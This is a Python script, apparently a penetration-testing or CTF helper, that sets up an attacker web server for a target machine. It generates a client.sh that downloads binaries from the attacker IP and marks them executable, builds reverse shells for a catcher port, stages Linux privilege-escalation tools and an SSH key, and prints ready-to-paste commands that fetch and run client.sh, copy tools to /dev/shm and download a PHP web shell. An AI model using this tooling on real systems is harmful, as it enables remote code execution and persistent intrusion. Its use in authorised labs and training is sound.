#!/bin/env python3 

import argparse
from pathlib import Path
from apputil import *
from distutils.dir_util import remove_tree, mkpath, copy_tree
from linuxprivesctools import main as linprevesc
from makeshells import main as makeshells

from config import *

BASEPATH = "html"
BINPATH = "bin"
SHELLPATH = "shells"
CLIENTBASEURL = None
DESTDIR = f"{SERVERPATH}/{BASEPATH}"

def createSSHkey(srcpath):
    sshkeyfilepath = f"{srcpath}/{SSHKEYFILE}"
    if not os.path.exists(sshkeyfilepath):
        with log.progress(f"Generating SSH key ({SSHKEYFILE})") as p:
            os.popen(SSHKEYGEN.replace("{SSHKEYFILEPATH}",sshkeyfilepath))

def makeclientscript(srcpath):
    with log.progress("Making client script") as p:
        with open(f"{srcpath}/client.sh","w") as f:
            f.write("#!/bin/sh\n\n")
            f.write(f"rm -rf {BINPATH}\n")
            f.write(f"mkdir {BINPATH}\n\n")

            with os.scandir(f"{srcpath}/{BINPATH}") as it:
                for entry in it:
                    if entry.is_file():
                        p = Path(entry.name).absolute()
                        f.write(f"{WGETCMD} {CLIENTBASEURL}/{BINPATH}/{p.name} {WGETOUTPUTOPTION} {BINPATH}/{p.name}\n")
                        if p.suffix in non_exe_extensions: continue
                        f.write(f"chmod +x {BINPATH}/{p.name}\n")
                        os.chmod(f"{srcpath}/{BINPATH}/{p.name}", 0o755 )

            f.write("\n\n")
            f.write(f"{WGETCMD} {CLIENTBASEURL}/bugout.sh {WGETOUTPUTOPTION} bugout.sh\n")
            f.write(f"chmod +x bugout.sh\n")
            f.write(f"chmod +x client.sh\n")
            f.write(f"{WGETCMD} {CLIENTBASEURL}/FINISHED {WGETOUTPUTOPTION} /dev/null\n")
            os.chmod(f"{srcpath}/bugout.sh", 0o755 )
            os.chmod(f"{srcpath}/client.sh", 0o755 )


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog=APPNAME,
        description="Setup Attacker webserver with the usual naughty tools.",
        epilog="Be ethically naughty."
    )
    parser.add_argument("ip", help="IP of our attacking box.")
    parser.add_argument("-w", help="Start webserver only.", action="count")
    parser.add_argument("-p", help="Webserver port.", default="80")
    parser.add_argument("-l", help="Shell catcher port.", default="9000")
    
    args = parser.parse_args()

    print(APPNAME)
    print(f"IP: {args.ip}\tWEB : {args.p}\tLPORT: {args.l}")
    CLIENTBASEURL = f"http://{args.ip}:{args.p}"

    if args.w is None:
        try:
            # Documentation says it will do this without reporting
            # errors, but the documentation lies.
            remove_tree(f"{SERVERPATH}")
        except:
            pass
        mkpath(f"{DESTDIR}/{BINPATH}")
        copy_tree(BASEPATH,f"{DESTDIR}")

        # Generate things here that don't depend on our IP address.
        # Things that do depend on our IP address have to go in the next section.
        linprevesc(f"{DESTDIR}/{BINPATH}")
        createSSHkey(f"{DESTDIR}")

    # Do things here that depend on our attacker IP address. Since
    # that address may change we specify it every time.
    makeshells(f"{DESTDIR}/{SHELLPATH}",args.ip,LPORT)
    makeclientscript(f"{DESTDIR}")
    # Make sure the SSH key is added to our keys.
    os.popen(f"{SSHADD} {DESTDIR}/{SSHKEYFILE}").read()

    # This is just some helpful command that can be copy/pasted so you don't have to
    # remember or type them.
    print("\nHelpful links and commands.")
    print("\nClients:")
    print(f"{WGETCMD} {CLIENTBASEURL}/client.sh {WGETOUTPUTOPTION} client.sh;bash client.sh")
    print(f"{SCPCMD} linprivesc.tgz USER@SYSTEM:/dev/shm/")
    print(f"{SCPCMD} {USERNAME}@{args.ip}:{DESTDIR}/linprivesc.tgz .")
    print("\nShells:")
    print(f"{WGETCMD} {CLIENTBASEURL}/shells/ptm-shell.php {WGETOUTPUTOPTION} ptm-shell.php")
    print("\nSSH Key:")
    print(f"{WGETCMD} {CLIENTBASEURL}/{SSHKEYFILE}.pub")
    print(f"{DESTDIR}/{SSHKEYFILE}.pub")
    print("\n")
    
    PwnServeDirectoryWithHTTP(port=WEBSERVERPORT,directory=f"{SERVERPATH}/html")
    while True:
        if getLastURI() == "/QUIT":
            break
        time.sleep(1)